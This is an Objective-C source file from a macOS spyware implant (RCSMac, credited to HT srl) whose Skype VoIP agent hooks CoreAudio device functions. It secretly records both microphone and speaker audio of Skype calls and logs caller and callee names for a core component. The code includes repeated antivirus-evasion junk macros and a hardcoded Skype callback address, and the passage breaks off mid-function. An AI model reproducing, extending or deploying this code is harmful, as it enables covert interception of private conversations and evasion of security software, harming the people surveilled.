/*
 *  RCSMAgentVoipSkype.m
 *  RCSMac
 *
 *  Created by revenge on 10/23/09.
 *  Copyright 2009 HT srl. All rights reserved.
 */

#import <pthread.h>
#import <sys/time.h>

#import "RCSMAgentVoipSkype.h"
#import "RCSMCommon.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#import "RCSMAVGarbage.h"

static AudioDeviceID inputDeviceID  = 0;
static AudioDeviceID outputDeviceID = 0;
static void *inputClientData        = 0;
static void *outputClientData       = 0;

static u_int gMaxSampleSize         = (512 * 1024); // 512KB
static u_int gCompressFactor        = 3;

static int64_t startedInputRec      = 0;
static int64_t startedOutputRec     = 0;

static int inBufferCounter          = 0;
static int outBufferCounter         = 0;

static Float64 inSampleRate         = 0;
static Float64 outSampleRate        = 0;

//static NSMutableData *inBuffer      = nil;
//static NSMutableData *outBuffer     = nil;

static NSMutableString *gLocalPeerName     = nil;
static NSMutableString *gRemotePeerName    = nil;

static BOOL gIsSkypeVoipAgentActive  = NO;
static BOOL gIsSkypeVoipAgentStopped = YES;

static AudioDeviceIOProcID gInProcID = NULL;
static AudioDeviceIOProcID gOutProcID= NULL;

pthread_mutex_t gCallbackMutex  = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t gInputMutex     = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t gOutputMutex    = PTHREAD_MUTEX_INITIALIZER;

static NSLock *timeLock   = nil;
static NSLock *peerLock   = nil;
static NSLock *agentLock  = nil;

BOOL isSkypeVersionSupported()
{
    NSDictionary *Dictionary = [[NSBundle mainBundle] infoDictionary];
  
    NSString *actualVersion = [Dictionary objectForKey:@"CFBundleVersion"];
    NSString *maxVersion = @"7.0";
    
    if ([maxVersion compare:actualVersion options:NSNumericSearch] == NSOrderedDescending)
        return YES;
    else
        return NO;
}

BOOL VPSkypeStartAgent()
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  BOOL success = YES;

  gIsSkypeVoipAgentActive   = YES;
  gIsSkypeVoipAgentStopped  = NO;

#ifdef DEBUG_VOIP_SKYPE
  infoLog(@"Setting up agent voip parameters");
#endif

  if (timeLock == nil)
    {
      timeLock = [[NSLock alloc] init];
    }
  if (peerLock == nil)
    {
      peerLock = [[NSLock alloc] init];
    }
  if (agentLock == nil)
    {
      agentLock = [[NSLock alloc] init];
    }

  if (gIsSkypeVoipAgentActive == YES)
    {
#ifdef DEBUG_VOIP_SKYPE
      warnLog(@"Agent is already activated");
#endif
      success = NO;
    }

  //
  // Read configuration
  //
  NSMutableData *readData = [mSharedMemoryLogging readMemoryFromComponent: COMP_AGENT
                                                                 forAgent: AGENT_VOIP
                                                          withCommandType: CM_AGENT_CONF];
  
  if (readData != nil)
    {
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"Found configuration for Agent Voip");
#endif
      shMemoryLog *shMemLog = (shMemoryLog *)[readData bytes];
      NSMutableData *confData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
                                                              length: shMemLog->commandDataSize];
      voipStruct *voipConfiguration = (voipStruct *)[confData bytes];
      
      gMaxSampleSize  = voipConfiguration->sampleSize;
      gCompressFactor = voipConfiguration->compression;
      
      [confData release];
    }
  else
    {
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"No configuration found for agent Voip");
#endif
    }
  
  gMaxSampleSize *= 8;
  
#ifdef DEBUG_VOIP_SKYPE
  infoLog(@"sampleSize  : %d", gMaxSampleSize);
  infoLog(@"compression : %d", gCompressFactor);
#endif
  
  [outerPool release];
  return success;
}

BOOL VPSkypeStopAgent()
{
  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];

  if (gIsSkypeVoipAgentActive == NO)
    {
#ifdef DEBUG_VOIP_SKYPE
      warnLog(@"Agent is already deactivated");
#endif
      return NO;
    }

  //[agentLock lock];
  gIsSkypeVoipAgentActive = NO;
  //[agentLock unlock];
  
  return YES;
}

void updateFlagForStopOperation()
{
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
#endif
  
  if (_real_AudioDeviceIOProcInput      == 0
      && _real_AudioDeviceIOProcOutput  == 0)
    {
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"Nothing registered, safe to stop here");
#endif

      if (gIsSkypeVoipAgentStopped == YES)
        {
#ifdef DEBUG_VOIP_SKYPE
          errorLog(@"Unexpected flag value");
#endif
        }
      else
        {
          gIsSkypeVoipAgentStopped = YES;

          //
          // Reset gLocalPeerName and gRemotePeerName
          //
          if (gLocalPeerName != nil)
            {
              [gLocalPeerName release];
              gLocalPeerName = nil;
            }
          if (gRemotePeerName != nil)
            {
              [gRemotePeerName release];
              gRemotePeerName = nil;
            }
        }
    }
}

BOOL logCall(u_int channel, BOOL closeCall)
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
  
#ifdef DEBUG_VOIP_SKYPE
  infoLog(@"Generating log for channel %d", channel);
#endif
  
  NSMutableData *entryData  = [[NSMutableData alloc] initWithLength: sizeof(voipAdditionalStruct)];
  //short dummyWord           = 0x0000;
  /*
  time_t unixTime;
  time(&unixTime);
  */
  struct timeval t;
  int success = gettimeofday(&t, NULL);
  int64_t filetime;
  
  if (success == 0)
    {
      filetime = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
    }
  else
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"error on gettimeofday()");
#endif
    }
  
  int64_t startedTime;
  
  if (channel == CHANNEL_MICROPHONE)
    {
      startedTime = (int64_t)startedInputRec;

      [timeLock lock];
      startedInputRec = filetime;
      [timeLock unlock];
    }
  else if (channel == CHANNEL_SPEAKERS)
    {
      startedTime = (int64_t)startedOutputRec;
      
      [timeLock lock];
      startedOutputRec = filetime;
      [timeLock unlock];
    }
  
  voipAdditionalStruct *voipAdditionalHeader = (voipAdditionalStruct *)
                                                [entryData bytes];
  voipAdditionalHeader->version           = LOG_VOIP_VERSION;
  voipAdditionalHeader->channel           = channel;
  voipAdditionalHeader->programType       = AGENT_VOIP + VOIP_SKYPE;
  voipAdditionalHeader->sampleRate        = (channel == CHANNEL_MICROPHONE)
                                            ? inSampleRate : outSampleRate;
  voipAdditionalHeader->isIngoing         = 0;
  voipAdditionalHeader->hiStartTimestamp  = (int64_t)startedTime >> 32;
  voipAdditionalHeader->loStartTimestamp  = (int64_t)startedTime & 0xFFFFFFFF;
  voipAdditionalHeader->hiStopTimestamp   = (int64_t)filetime >> 32;
  voipAdditionalHeader->loStopTimestamp   = (int64_t)filetime & 0xFFFFFFFF;

#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"hiStartFromInput: %x", voipAdditionalHeader->hiStartTimestamp);
  verboseLog(@"loStartFromInput: %x", voipAdditionalHeader->loStartTimestamp);
#endif

  if (voipAdditionalHeader->hiStartTimestamp == 0)
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"hiStartTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif
      [outerPool release];
      return NO;
    }
  
  if (voipAdditionalHeader->loStartTimestamp == 0)
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"loStartTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif
      [outerPool release];
      return NO;
    }
  if (voipAdditionalHeader->hiStopTimestamp == 0)
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"hiStopTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif
      [outerPool release];
      return NO;
    }
  if (voipAdditionalHeader->loStopTimestamp == 0)
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"loStopTime is ZERO!!!!!!!!!!!!!!!!!!!!!!!!!");
#endif
      [outerPool release];
      return NO;
    }
  
  [peerLock lock];
  voipAdditionalHeader->localPeerLength   = [gLocalPeerName lengthOfBytesUsingEncoding:
                                             NSUTF16LittleEndianStringEncoding];
  voipAdditionalHeader->remotePeerLength  = [gRemotePeerName lengthOfBytesUsingEncoding:
                                             NSUTF16LittleEndianStringEncoding];
  [peerLock unlock];
  
  [peerLock lock];
  // Local Peer Name
  [entryData appendData: [gLocalPeerName dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
  [peerLock unlock];
  
  // Null terminator
  //[entryData appendBytes: &dummyWord
  //                length: sizeof(short)];
  
  [peerLock lock];
  // Remote Peer Name
  [entryData appendData: [gRemotePeerName dataUsingEncoding:
                          NSUTF16LittleEndianStringEncoding]];
  [peerLock unlock];
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"remotePeers: %@", gRemotePeerName);
#endif
  
  // Null terminator
  //[entryData appendBytes: &dummyWord
  //                length: sizeof(short)];
  
  u_int flags = (channel == CHANNEL_MICROPHONE)
                            ? SKYPE_CHANNEL_INPUT
                            : SKYPE_CHANNEL_OUTPUT;
  
  if (closeCall == YES)
    {
#ifdef DEBUG_VOIP_SKYPE
      warnLog(@"Closing CALL");
#endif
      flags |= SKYPE_CLOSE_CALL;
    }
  
  NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
  shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
  
  shMemoryHeader->status          = SHMEM_WRITTEN;
  shMemoryHeader->agentID         = AGENT_VOIP;
  shMemoryHeader->direction       = D_TO_CORE;
  shMemoryHeader->commandType     = CM_CLOSE_LOG_WITH_HEADER;
  
  struct timeval tTime;
  gettimeofday(&tTime, NULL);
  int highSec = (int32_t)tTime.tv_sec << 20;
  shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
  
  shMemoryHeader->flag            = flags;
  shMemoryHeader->commandDataSize = [entryData length];
  
  memcpy(shMemoryHeader->commandData,
         [entryData bytes],
         [entryData length]);
  
  if ([mSharedMemoryLogging writeMemory: logData
                                 offset: 0
                          fromComponent: COMP_AGENT] == TRUE)
    {
#ifdef DEBUG_VOIP_SKYPE
      verboseLog(@"Voip close_log data sent through Shared Memory");
#endif
    }
  else
    {
#ifdef DEBUG_VOIP_SKYPE
      errorLog(@"Error while logging voip to shared memory");
#endif
    }
  
  [logData release];
  [entryData release];
  [outerPool drain];
  
  return TRUE;
}

OSStatus
_hook_AudioDeviceIOProcInput (AudioDeviceID         inDevice,
                              const AudioTimeStamp  *inNow,
                              const AudioBufferList *inInputData,
                              const AudioTimeStamp  *inInputTime,
                              AudioBufferList       *outOutputData,
                              const AudioTimeStamp  *inOutputTime,
                              void                  *inClientData)
{
  OSStatus status;

#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
#endif
  
  if (startedInputRec == 0)
    {
      struct timeval t;
      int success = gettimeofday(&t, NULL);
      
      if (success == 0)
        {
          startedInputRec = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
        }
      else
        {
#ifdef DEBUG_VOIP_SKYPE
          errorLog(@"error on gettimeofday()");
#endif
        }
    }
  
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"_real_input: %p", _real_AudioDeviceIOProcInput);
#endif
  
  status = _real_AudioDeviceIOProcInput(inDevice,
                                        inNow,
                                        inInputData,
                                        inInputTime,
                                        outOutputData,
                                        inOutputTime,
                                        inputClientData);
  
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"IOProcInput status: %lu", status);
#endif
  
  if (inInputData->mNumberBuffers > 0)
    {
      //BOOL temp = NO;
      //[agentLock lock];
      //temp = gIsSkypeVoipAgentActive;
      //[agentLock unlock];

      if (gIsSkypeVoipAgentActive == YES)
        {
          if (inInputData->mBuffers[0].mData != NULL)
            {
              if (inBufferCounter >= gMaxSampleSize)
                {
                  logCall (CHANNEL_MICROPHONE, NO);
                  inBufferCounter = 0;
                }
              
              pthread_mutex_lock(&gInputMutex);
              NSMutableData *entryData = [[NSMutableData alloc] initWithBytes: inInputData->mBuffers[0].mData
                                                                       length: inInputData->mBuffers[0].mDataByteSize ];
              
              NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
              shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
              
              inBufferCounter += [entryData length];
              
              shMemoryHeader->status          = SHMEM_WRITTEN;
              shMemoryHeader->agentID         = AGENT_VOIP;
              shMemoryHeader->direction       = D_TO_CORE;
              shMemoryHeader->commandType     = CM_LOG_DATA;
              
              struct timeval tTime;
              gettimeofday(&tTime, NULL);
              int highSec = (int32_t)tTime.tv_sec << 20;
              shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
              
              shMemoryHeader->flag            = SKYPE_CHANNEL_INPUT;
              shMemoryHeader->commandDataSize = [entryData length];
              
              //infoLog(@"entryData length: %d", [entryData length]);
              
              memcpy(shMemoryHeader->commandData,
                     [entryData bytes],
                     [entryData length]);
              
              if ([mSharedMemoryLogging writeMemory: logData
                                             offset: 0
                                      fromComponent: COMP_AGENT] == TRUE)
                {
#ifdef DEBUG_VOIP_SKYPE
                  verboseLog(@"Voip data sent through Shared Memory");
#endif
                }
              else
                {
#ifdef DEBUG_VOIP_SKYPE
                  verboseLog(@"Error while logging voip to shared memory");
#endif
                }
              
              [entryData release];
              [logData release];
              
              pthread_mutex_unlock(&gInputMutex);
            }
        }
    }
  
  //usleep(2000);
  
  return status;
}

OSStatus
_hook_AudioDeviceIOProcOutput (AudioDeviceID         inDevice,
                               const AudioTimeStamp  *inNow,
                               const AudioBufferList *inInputData,
                               const AudioTimeStamp  *inInputTime,
                               AudioBufferList       *outOutputData,
                               const AudioTimeStamp  *inOutputTime,
                               void                  *inClientData)
{
  OSStatus status;
  
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
#endif
  
  if (startedOutputRec == 0)
    {
      struct timeval t;
      int success = gettimeofday(&t, NULL);
      
      if (success == 0)
        {
          startedOutputRec = ((int64_t)t.tv_sec * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
        }
      else
        {
#ifdef DEBUG_VOIP_SKYPE
          errorLog(@"error on gettimeofday()");
#endif
        }
      /*
      if (startedOutputRec == startedInputRec)
        {
          infoLog(@"ANOMALY IN ProcOutput! times are equal");
        }
       */
      //[logLock lock];
      //startedOutputRec = ((int64_t)unixTime * (int64_t)RATE_DIFF) + (int64_t)EPOCH_DIFF;
      //[logLock unlock];
    }
  
  status = _real_AudioDeviceIOProcOutput(inDevice,
                                         inNow,
                                         inInputData,
                                         inInputTime,
                                         outOutputData,
                                         inOutputTime,
                                         outputClientData);
  
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"IOProcOutput status: %lu", status);
#endif
  
  if (outOutputData->mNumberBuffers > 0)
    {
      //BOOL temp = NO;
      //[agentLock lock];
      //temp = gIsSkypeVoipAgentActive;
      //[agentLock unlock];

      if (gIsSkypeVoipAgentActive == YES)
        {
          if (outOutputData->mBuffers[0].mData != NULL)
            {
              if (outBufferCounter >= gMaxSampleSize)
                {
                  logCall (CHANNEL_SPEAKERS, NO);
                  outBufferCounter = 0;
                }
              
              pthread_mutex_lock(&gOutputMutex);
              
              NSMutableData *entryData = [[NSMutableData alloc] initWithBytes: outOutputData->mBuffers[0].mData
                                                                       length: outOutputData->mBuffers[0].mDataByteSize ];
              
              outBufferCounter += [entryData length];
              
              NSMutableData *logData = [[NSMutableData alloc] initWithLength: sizeof(shMemoryLog)];
              shMemoryLog *shMemoryHeader = (shMemoryLog *)[logData bytes];
              
              shMemoryHeader->status          = SHMEM_WRITTEN;
              shMemoryHeader->agentID         = AGENT_VOIP;
              shMemoryHeader->direction       = D_TO_CORE;
              shMemoryHeader->commandType     = CM_LOG_DATA;
              
              struct timeval tTime;
              gettimeofday(&tTime, NULL);
              int highSec = (int32_t)tTime.tv_sec << 20;
              shMemoryHeader->timestamp       = highSec | tTime.tv_usec;
              
              shMemoryHeader->flag            = SKYPE_CHANNEL_OUTPUT;
              shMemoryHeader->commandDataSize = [entryData length];
              
              memcpy(shMemoryHeader->commandData,
                     [entryData bytes],
                     [entryData length]);
              
              if ([mSharedMemoryLogging writeMemory: logData
                                             offset: 0
                                      fromComponent: COMP_AGENT] == TRUE)
                {
#ifdef DEBUG_VOIP_SKYPE
                  verboseLog(@"Voip data sent through Shared Memory");
#endif
                }
              else
                {
#ifdef DEBUG_VOIP_SKYPE
                  verboseLog(@"Error while logging voip to shared memory");
#endif
                }
              
              [entryData release];
              [logData release];
              
              pthread_mutex_unlock(&gOutputMutex);
            }
        }
    }
  
  //usleep(2000);
  
  return status;
}

OSStatus
_hook_AudioDeviceStart (AudioDeviceID           inDevice,
                        AudioDeviceIOProcID     inProcID)
{
  OSStatus status;

#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
#endif

  //return _real_AudioDeviceStart(inDevice, inProcID);

  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];

  if (gIsSkypeVoipAgentActive == NO && gIsSkypeVoipAgentStopped == YES)
    {
      status = _real_AudioDeviceStart(inDevice, inProcID);
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"inProcID: %p", inProcID);
      verboseLog(@"GENERIC: %ld", status);
#endif
      return status;
    }

  if (inSampleRate == 0)
    {
      AudioStreamBasicDescription streamDesc;
      UInt32 propertySize = sizeof(streamDesc);

      status = AudioDeviceGetProperty(inputDeviceID, 0, true, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
      inSampleRate  = streamDesc.mSampleRate;

#ifdef DEBUG_VOIP_SKYPE
      verboseLog(@"inSampleRate: %f", inSampleRate);
#endif
    }
  if (outSampleRate == 0)
    {
      AudioStreamBasicDescription streamDesc;
      UInt32 propertySize = sizeof(streamDesc);

      status = AudioDeviceGetProperty(outputDeviceID, 0, false, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
      outSampleRate  = streamDesc.mSampleRate;

#ifdef DEBUG_VOIP_SKYPE
      verboseLog(@"outSampleRate: %f", outSampleRate);
#endif
    }

  //
  // We need to start fakeProc instead of realProc
  // (Proc passed instead of obtained ProcID)
  //
  if (inProcID == _real_AudioDeviceIOProcInput)
    {
#ifdef DEBUG_VOIP_SKYPE
      AudioStreamBasicDescription streamDesc;
      UInt32 propertySize;
      // Print out the device status
      propertySize = sizeof(streamDesc);
      status = AudioDeviceGetProperty(inputDeviceID, 0, true, kAudioDevicePropertyStreamFormat, &propertySize, &streamDesc);
      
      verboseLog(@"Hardware format:");
      verboseLog(@"%5d SampleRate", (unsigned int)streamDesc.mSampleRate);
      verboseLog(@"%c%c%c%c FormatID",
                 (streamDesc.mFormatID & 0xff000000) >> 24,
                 (streamDesc.mFormatID & 0x00ff0000) >> 16,
                 (streamDesc.mFormatID & 0x0000ff00) >>  8,
                 (streamDesc.mFormatID & 0x000000ff) >>  0);
      verboseLog(@"%5d BytesPerPacket", streamDesc.mBytesPerPacket);
      verboseLog(@"%5d FramesPerPacket", streamDesc.mFramesPerPacket);
      verboseLog(@"%5d BytesPerFrame", streamDesc.mBytesPerFrame);
      verboseLog(@"%5d ChannelsPerFrame", streamDesc.mChannelsPerFrame);
      verboseLog(@"%5d BitsPerChannel", streamDesc.mBitsPerChannel);
      
      //printFormatFlags(streamDesc);
#endif
    
      status = _real_AudioDeviceStart(inDevice, _hook_AudioDeviceIOProcInput);
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"INPUT: %ld", status);
#endif
    }
  else if (inProcID == _real_AudioDeviceIOProcOutput)
    {
      status = _real_AudioDeviceStart(inDevice, _hook_AudioDeviceIOProcOutput);
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"OUTPUT: %ld", status);
#endif
    }
  else
    {
      status = _real_AudioDeviceStart(inDevice, inProcID);
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"GENERIC: %ld", status);
#endif
    }
  
  return status;
}

OSStatus
_hook_AudioDeviceStop (AudioDeviceID           inDevice,
                       AudioDeviceIOProcID     inProcID)
{
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
  infoLog(@"inProcID: %p", inProcID);
#endif

  //return _real_AudioDeviceStop(inDevice, inProcID);

  OSStatus status;

  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];

  if (gIsSkypeVoipAgentActive == NO && gIsSkypeVoipAgentStopped == YES)
    {
      status = _real_AudioDeviceStop(inDevice, inProcID);
#ifdef DEBUG_VOIP_SKYPE
      verboseLog(@"AudioDeviceStop generic: %ld", status);
#endif
      return status;
    }

  if (inProcID == _real_AudioDeviceIOProcInput
      || inProcID == gInProcID)
    {
      status = _real_AudioDeviceStop(inDevice, gInProcID);

#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"INPUT: %ld", status);
      infoLog(@"Logging mic");
#endif

      logCall(CHANNEL_MICROPHONE, YES);

      startedInputRec = 0;
      inSampleRate    = 0;
    }
  else if (inProcID == _real_AudioDeviceIOProcOutput
           || inProcID == gOutProcID)
    {
      status = _real_AudioDeviceStop(inDevice, gOutProcID);

#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"OUTPUT: %ld", status);
      infoLog(@"Logging speaker");
#endif

      logCall(CHANNEL_SPEAKERS, YES);

      startedOutputRec = 0;
      outSampleRate    = 0;
    }
  else
    {
      status = _real_AudioDeviceStop(inDevice, inProcID);

#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"GENERIC: %ld", status);
#endif
    }
  
  return status;
}

//
// Skype 5.x uses the new AudioDevice[CreateIOProcID|DestroyIOProcID]
//
OSStatus
_hook_AudioDeviceCreateIOProcID (AudioDeviceID inDevice,
                                 AudioDeviceIOProc inProc,
                                 void *inClientData,
                                 AudioDeviceIOProcID *outAudioProcID)
{
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"");
#endif
  
  OSStatus success;
  //success = _real_AudioDeviceCreateIOProcID(inDevice,
  //inProc,
  //inClientData,
  //outAudioProcID);
#ifdef DEBUG_VOIP_SKYPE
  verboseLog(@"inProc: %p", inProc);
  verboseLog(@"outProcID: %p", *outAudioProcID);
#endif
  //return success;
  
  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];
  
  if (gIsSkypeVoipAgentActive == NO)
  {
    success = _real_AudioDeviceCreateIOProcID(inDevice,
                                              inProc,
                                              inClientData,
                                              outAudioProcID);
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"inDevice : %d", inDevice);
    infoLog(@"inProc   : %p", inProc);
    infoLog(@"outProcID: %p", *outAudioProcID);
    infoLog(@"GENERIC  : %ld", success);
#endif
    return success;
  }
  
  //
  // Agent is active - grab inputDeviceID and outputDeviceID in order to
  // understand which kind of ProcID is being registered (input/output)
  //
  UInt32 propertySize;
  
  propertySize = sizeof(inputDeviceID);
  success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultInputDevice,
                                     &propertySize,
                                     &inputDeviceID);
  
  propertySize = sizeof(outputDeviceID);
  success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultOutputDevice,
                                     &propertySize,
                                     &outputDeviceID);
  
  if (inDevice == inputDeviceID)
  {
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"Registering input proc");
#endif
    
    _real_AudioDeviceIOProcInput = (void *)inProc;
    inputClientData = (void *)inClientData;
    
    success = _real_AudioDeviceCreateIOProcID(inDevice,
                                              _hook_AudioDeviceIOProcInput,
                                              _hook_AudioDeviceIOProcInput,
                                              outAudioProcID);
    gInProcID = *outAudioProcID;
    
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"inProc: %p", inProc);
    infoLog(@"outProcID: %p", *outAudioProcID);
    infoLog(@"INPUT: %ld", success);
#endif
  }
  else if (inDevice == outputDeviceID)
  {
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"Registering output proc");
#endif
    
    //
    // dirty, we know that at 0xa9c530 there's the skype callback
    // responsible for managing the output channel (voice, no effects)
    // thus we look only for that function for now
    //
    if (_real_AudioDeviceIOProcOutput == nil
        && (NSUInteger)inProc         == 0xa9c530)
    {
      _real_AudioDeviceIOProcOutput = (void *)inProc;
      outputClientData = (void *)inClientData;
      
      success = _real_AudioDeviceCreateIOProcID(inDevice,
                                                _hook_AudioDeviceIOProcOutput,
                                                _hook_AudioDeviceIOProcOutput,
                                                outAudioProcID);
      gOutProcID = *outAudioProcID;
    }
    else
    {
      success = _real_AudioDeviceCreateIOProcID(inDevice,
                                                inProc,
                                                inClientData,
                                                outAudioProcID);
#ifdef DEBUG_VOIP_SKYPE
      infoLog(@"Output already hooked (%p) or wrong proc (%p)",
              _real_AudioDeviceIOProcOutput,
              inProc);
#endif
    }
    
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"inProc: %p", inProc);
    infoLog(@"outProcID: %p", *outAudioProcID);
    infoLog(@"OUTPUT: %ld", success);
#endif
  }
  else
  {
    success = _real_AudioDeviceCreateIOProcID(inDevice,
                                              inProc,
                                              inClientData,
                                              outAudioProcID);
#ifdef DEBUG_VOIP_SKYPE
    verboseLog(@"GENERIC: %ld", success);
    verboseLog(@"outProcID: %p", *outAudioProcID);
#endif
  }
  
  return success;
}

OSStatus
_hook_AudioDeviceDestroyIOProcID (AudioDeviceID       inDevice,
                                  AudioDeviceIOProcID inIOProcID)
{
  OSStatus status;
  //status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
  //return status;
  
  // AV evasion: only on release build
  AV_GARBAGE_008
  
  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];
  
  if (gIsSkypeVoipAgentActive     == NO
      && gIsSkypeVoipAgentStopped == YES
      && inIOProcID               != gOutProcID)
  { 
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    return status;
  }
  
  if (inIOProcID == gInProcID)
  {    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
    _real_AudioDeviceIOProcInput  = 0;
    inputClientData               = 0;
    gInProcID                     = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_006
    
    updateFlagForStopOperation();
    
    // AV evasion: only on release build
    AV_GARBAGE_003
  }
  else if (inIOProcID == gOutProcID)
  {    
    // AV evasion: only on release build
    AV_GARBAGE_000
    
    _real_AudioDeviceIOProcOutput = 0;
    outputClientData              = 0;
    gOutProcID                    = 0;
    
    // AV evasion: only on release build
    AV_GARBAGE_008
    
    updateFlagForStopOperation();
    
    // AV evasion: only on release build
    AV_GARBAGE_001
    
  }
  else
  {
#ifdef DEBUG_VOIP_SKYPE
    infoLog(@"Destroying Generic");
#endif
  }
  
  // AV evasion: only on release build
  AV_GARBAGE_000
  
  status = _real_AudioDeviceDestroyIOProcID(inDevice, inIOProcID);
  
  // AV evasion: only on release build
  AV_GARBAGE_006
  
  return status;
}

//
// This is used for recording in/out audio on call on Skype 2.x
//
OSStatus
_hook_AudioDeviceAddIOProc (AudioDeviceID       inDevice,
                            AudioDeviceIOProc   inProc,
                            void               *inClientData)
{
  OSStatus success;
  UInt32 propertySize;
  
  // AV evasion: only on release build
  AV_GARBAGE_001
  
  if (_real_AudioDeviceIOProcInput      == 0
      || _real_AudioDeviceIOProcOutput  == 0)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_002
      
      propertySize = sizeof(inputDeviceID);
      success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultInputDevice,
                                         &propertySize,
                                         &inputDeviceID); 
      
      // AV evasion: only on release build
      AV_GARBAGE_003
      
      if (success == noErr)
        {
          // AV evasion: only on release build
          AV_GARBAGE_004
          
          if (inputDeviceID != kAudioDeviceUnknown)
            {
              // AV evasion: only on release build
              AV_GARBAGE_006
              
              if (inputDeviceID == inDevice)
                {                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  _real_AudioDeviceIOProcInput = (void *)inProc;
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_005
                  
                  inputClientData = (void *)inClientData;
                }
              else
                {   
                  // AV evasion: only on release build
                  AV_GARBAGE_001
                
                  propertySize = sizeof(outputDeviceID);
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_008
                  
                  success = AudioHardwareGetProperty(kAudioHardwarePropertyDefaultOutputDevice,
                                                     &propertySize,
                                                     &outputDeviceID);
                  
                  // AV evasion: only on release build
                  AV_GARBAGE_007
                  
                  if (success == noErr)
                    {
                      if (outputDeviceID != kAudioDeviceUnknown)
                        {
                          // AV evasion: only on release build
                          AV_GARBAGE_003
                          
                          if (outputDeviceID == inDevice)
                            {
                              // AV evasion: only on release build
                              AV_GARBAGE_006
                              
                              _real_AudioDeviceIOProcOutput = (void *)inProc;
                              
                              // AV evasion: only on release build
                              AV_GARBAGE_007
                              
                              outputClientData = (void *)inClientData;
                              
                              // AV evasion: only on release build
                              AV_GARBAGE_002     
                            }
                        }
                    }
                }
            }
        }
    }
  
  //BOOL temp = NO;
  //[agentLock lock];
  //temp = gIsSkypeVoipAgentActive;
  //[agentLock unlock];

  if (gIsSkypeVoipAgentActive == YES)
    { 
      // AV evasion: only on release build
      AV_GARBAGE_006
    
      if (inDevice == inputDeviceID)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_006
        
          success = _real_AudioDeviceAddIOProc(inDevice,
                                               _hook_AudioDeviceIOProcInput,
                                               _hook_AudioDeviceIOProcInput);
          
          // AV evasion: only on release build
          AV_GARBAGE_003
          
        }
      else if (inDevice == outputDeviceID)
        { 
          // AV evasion: only on release build
          AV_GARBAGE_002
        
          success = _real_AudioDeviceAddIOProc(inDevice,
                                               _hook_AudioDeviceIOProcOutput,
                                               _hook_AudioDeviceIOProcOutput);
          
          // AV evasion: only on release build
